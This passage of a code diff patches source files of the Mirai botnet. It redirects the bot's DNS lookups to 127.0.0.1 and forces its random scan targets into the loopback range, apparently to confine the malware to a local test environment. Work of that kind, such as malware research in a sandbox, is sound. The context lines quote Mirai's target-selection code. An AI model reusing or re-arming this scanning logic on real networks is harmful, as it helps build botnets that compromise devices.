@@ -34,20 +34,35 @@ index 8c0510f..df269ac 100755
  #endif
  
      while (TRUE)
+diff --git a/mirai/bot/resolv.c b/mirai/bot/resolv.c
+index ea1f62d..b7dc633 100755
+--- a/mirai/bot/resolv.c
++++ b/mirai/bot/resolv.c
+@@ -81,8 +81,8 @@ struct resolv_entries *resolv_lookup(char *domain)
+ 
+     util_zero(&addr, sizeof (struct sockaddr_in));
+     addr.sin_family = AF_INET;
+-    addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);
+-    addr.sin_port = htons(53);
++    addr.sin_addr.s_addr = INET_ADDR(127,0,0,1);
++    addr.sin_port = htons(55);
+ 
+     // Set up the dns query
+     dnsh->id = dns_id;
 diff --git a/mirai/bot/scanner.c b/mirai/bot/scanner.c
-index 615aa93..e7d6374 100755
+index 615aa93..dfe53f0 100755
 --- a/mirai/bot/scanner.c
 +++ b/mirai/bot/scanner.c
-@@ -700,7 +700,8 @@ static ipv4_t get_random_ip(void)
+@@ -700,6 +700,9 @@ static ipv4_t get_random_ip(void)
            (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
      );
  
--    return INET_ADDR(o1,o2,o3,o4);
-+    // return INET_ADDR(o1,o2,o3,o4);
-+    return INET_ADDR(127, 0, 0, 1);
++    o1 = 127;
++    o2 = 0;
++    o3 = 0;
+     return INET_ADDR(o1,o2,o3,o4);
  }
  
- static int consume_iacs(struct scanner_connection *conn)
 diff --git a/mirai/bot/table.c b/mirai/bot/table.c
 index 13b341e..18ffc79 100755
 --- a/mirai/bot/table.c
